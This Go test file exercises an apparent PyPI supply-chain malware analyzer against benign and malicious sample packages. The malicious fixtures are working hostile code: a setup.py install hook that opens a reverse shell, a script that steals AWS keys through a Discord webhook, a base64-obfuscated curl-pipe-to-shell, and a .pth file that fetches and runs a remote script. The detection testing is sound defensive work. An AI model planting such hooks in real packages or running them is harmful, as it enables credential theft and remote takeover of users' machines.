package analyzer_test

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/cawalch/go-yara-supplychain/pkg/analyzer"
	"github.com/cawalch/go-yara-supplychain/pkg/ecosystems/pypi"
)

func TestPyPIEfficacy(t *testing.T) {
	engine, err := analyzer.NewEngine()
	if err != nil {
		t.Fatalf("failed initializing engine: %v", err)
	}

	tests := []struct {
		name           string
		files          map[string]string
		expectedAction analyzer.Action
		expectedRisk   analyzer.RiskLevel
	}{
		{
			name: "benign-pyproject-fastapi-plugin",
			files: map[string]string{
				"pyproject.toml": `
[project]
name = "fastapi-json-logger"
version = "0.2.0"
description = "Clean logging middleware for FastAPI"
dependencies = ["fastapi", "uvicorn"]
`,
				"logger.py": `
import json
import logging

def format_log(record):
    return json.dumps({"level": record.levelname, "msg": record.getMessage()})
`,
			},
			expectedAction: analyzer.ActionPass,
			expectedRisk:   analyzer.RiskBenign,
		},
		{
			name: "benign-setup-py-clean-library",
			files: map[string]string{
				"setup.py": `
from setuptools import setup, find_packages

setup(
    name='clean-string-utils',
    version='1.0.0',
    packages=find_packages(),
)
`,
				"utils.py": `
def slugify(text):
    return "-".join(text.lower().split())
`,
			},
			expectedAction: analyzer.ActionPass,
			expectedRisk:   analyzer.RiskBenign,
		},
		{
			name: "malicious-cmdclass-reverse-shell",
			files: map[string]string{
				"setup.py": `
from setuptools import setup
from setuptools.command.install import install
import socket, subprocess, os

class CustomInstall(install):
    def run(self):
        install.run(self)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("10.0.0.1", 4444))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        subprocess.call(["/bin/sh", "-i"])

setup(
    name='reqeusts-typosquat',
    version='2.31.0',
    cmdclass={'install': CustomInstall},
)
`,
			},
			expectedAction: analyzer.ActionBlock,
			expectedRisk:   analyzer.RiskCritical,
		},
		{
			name: "malicious-aws-credential-stealer-discord-webhook",
			files: map[string]string{
				"setup.py": `
import os
import urllib.request
import json

from setuptools import setup

# Steal AWS keys during package execution
aws_key = os.environ.get("AWS_SECRET_ACCESS_KEY", "")
aws_id = os.environ.get("AWS_ACCESS_KEY_ID", "")
if aws_key:
    req = urllib.request.Request(
        "https://discord.com/api/webhooks/12345/abcdef",
        data=json.dumps({"content": f"Found key: {aws_id}:{aws_key}"}).encode("utf-8"),
        headers={"Content-Type": "application/json"}
    )
    try:
        urllib.request.urlopen(req)
    except:
        pass

setup(name='colorama-v2', version='0.4.6')
`,
			},
			expectedAction: analyzer.ActionBlock,
			expectedRisk:   analyzer.RiskCritical,
		},
		{
			name: "malicious-obfuscated-base64-exec",
			files: map[string]string{
				"setup.py": `
import base64
from setuptools import setup

payload = b"aW1wb3J0IG9zOyBvcy5zeXN0ZW0oImN1cmwgLXMgaHR0cDovL2V2aWwuYml6L3B3biB8IHNoIik="
exec(base64.b64decode(payload))

setup(name='speed-cache', version='1.0.0')
`,
			},
			expectedAction: analyzer.ActionBlock,
			expectedRisk:   analyzer.RiskCritical,
		},
		{
			name: "malicious-pth-autoexec-litellm",
			files: map[string]string{
				"pyproject.toml": `
[project]
name = "litellm-proxy"
version = "1.82.8"
`,
				"litellm_init.pth": "import os; os.system('curl -sL https://malware.biz/exfil | bash')\n",
			},
			expectedAction: analyzer.ActionBlock,
			expectedRisk:   analyzer.RiskCritical,
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			tmp := t.TempDir()
			for path, content := range tc.files {
				fullPath := filepath.Join(tmp, path)
				if err := os.MkdirAll(filepath.Dir(fullPath), 0755); err != nil {
					t.Fatal(err)
				}
				if err := os.WriteFile(fullPath, []byte(content), 0644); err != nil {
					t.Fatal(err)
				}
			}

			pkg, err := pypi.ParsePackageDir(tmp)
			if err != nil {
				t.Fatalf("failed parsing package dir: %v", err)
			}

			verdict, err := engine.AnalyzePyPIPackage(pkg)
			if err != nil {
				t.Fatalf("failed analyzing package: %v", err)
			}

			if verdict.Action != tc.expectedAction {
				t.Errorf("expected action %s, got %s (risk: %s, score: %.2f)",
					tc.expectedAction, verdict.Action, verdict.RiskLevel, verdict.ConfidenceScore)
			}
			if verdict.RiskLevel != tc.expectedRisk {
				t.Errorf("expected risk %s, got %s (score: %.2f)",
					tc.expectedRisk, verdict.RiskLevel, verdict.ConfidenceScore)
			}
			if verdict.Ecosystem != "pypi" {
				t.Errorf("expected ecosystem 'pypi', got '%s'", verdict.Ecosystem)
			}
		})
	}
}
